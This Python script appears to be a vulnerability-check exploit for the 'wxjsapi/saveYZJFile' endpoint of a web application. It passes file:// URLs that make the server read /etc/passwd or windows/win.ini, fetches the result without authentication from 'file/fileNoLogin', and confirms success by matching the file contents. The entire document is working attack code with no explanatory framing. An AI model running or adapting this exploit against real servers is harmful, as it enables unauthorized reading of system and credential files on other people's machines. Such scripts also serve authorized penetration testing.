import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "json" in response.headers["Content-Type"] and "id" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			linux0=True
			try:
				var=re.findall(r"\"id\":\"(.+?)\"",response.text)[0]
			except:
				var=''
		else:
			linux0=False
			var=''
	else:
		if response.status_code == 200 and "json" in response.headers["Content-Type"] and "id" in response.text:
			linux0=True
			try:
				var=re.findall(r"\"id\":\"(.+?)\"",response.text)[0]
			except:
				var=''
		else:
			linux0=False
			var=''
	url=baseurl+f"file/fileNoLogin/{var}"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and re.search("root:[x*]:0:0:",response.text):
		linux1=True
	else:
		linux1=False
	url=baseurl+"wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "json" in response.headers["Content-Type"] and "id" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			windows0=True
			try:
				var=re.findall(r"\"id\":\"(.+?)\"",response.text)[0]
			except:
				var=''
		else:
			windows0=False
			var=''
	else:
		if response.status_code == 200 and "json" in response.headers["Content-Type"] and "id" in response.text:
			windows0=True
			try:
				var=re.findall(r"\"id\":\"(.+?)\"",response.text)[0]
			except:
				var=''
		else:
			windows0=False
			var=''
	url=baseurl+f"file/fileNoLogin/{var}"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and ("for 16-bit app support" in response.text or "[extensions]" in response.text):
		windows1=True
	else:
		windows1=False
	if linux0 and linux1 or windows0 and windows1:
		return True
	else:
		return False
